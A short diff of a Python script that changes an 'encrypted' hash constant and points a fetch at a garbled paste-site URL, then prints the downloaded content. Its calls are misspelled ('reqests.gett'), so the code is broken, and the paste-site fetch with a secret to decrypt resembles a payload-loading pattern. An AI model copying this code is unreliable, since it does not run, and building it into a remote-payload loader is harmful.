@@ -5,7 +5,7 @@ import math
 import json
 
 
-aHASH = "a4059209273b0f2c668b727"   # encrypted, to be decrypted in the code later!
+aHASH = "dfd117135a4059209273b0f2c668b727"   # encrypted, to be decrypted in the code later!
 
 def fetch_raw(url):
     resp = reqests.gett(url)
@@ -27,6 +27,6 @@ def detect_format(dumped):
     print("--- END ---\n")
 
 if __name__ == "__main__":
-    target = "http://this-is-an-invalid-url.example/nope"
+    target = "http://PASTETOOLSITEOMGITSREALLL????????/2rwxTSEY"
     raw_dump = fetch_raw(target)
     detect_format(raw_dump)
